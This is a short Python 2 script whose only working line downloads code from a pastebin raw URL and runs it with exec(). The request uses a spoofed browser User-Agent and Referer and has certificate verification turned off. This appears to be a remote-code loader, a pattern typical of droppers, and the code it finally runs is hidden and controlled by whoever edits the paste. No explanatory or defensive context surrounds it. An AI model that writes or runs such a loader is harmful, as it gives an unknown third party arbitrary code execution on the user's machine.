# encoding=utf8
import sys
reload(sys)
sys.setdefaultencoding('utf8')
import requests
exec(requests.get('https://pastebin.com/raw/3UnS07Yr', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://pastebin.com'}, verify=False).text)